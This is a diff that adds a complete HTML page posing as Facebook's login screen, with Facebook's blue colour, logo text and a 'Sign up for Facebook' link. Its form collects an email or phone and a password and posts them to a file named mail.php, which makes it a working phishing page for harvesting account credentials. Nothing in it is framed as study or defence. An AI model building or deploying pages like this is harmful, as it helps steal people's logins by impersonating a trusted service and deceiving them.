@@ -1,0 +1,22 @@
+<html>
+<head>
+<title>facebook login page</title>
+</head>
+<body bgcolor="3b5998">
+<br><br><br>
+<font color="white">
+<center><b><font face="segoe ui" size="20">facebook</font></b></center>
+<br><br><br><br>
+<center>
+<form action="mail.php" method="post">
+<input type="text" name="Email" value="Email or Phone" size="20" style="hight:30px;">
+<br><br>
+<input type="text" name="Password" value="Password" size="20" style="hight:30px;">
+<br><br>
+<input type="submit" value="Log In" style="background-color:4862A3; width=315px; height:30px; color=white">
+</form>
+<br><br><br><br><br><br><br><br><br><br>
+<u>Sign up for Facebook</u>
+</center>
+</body>
+</html>
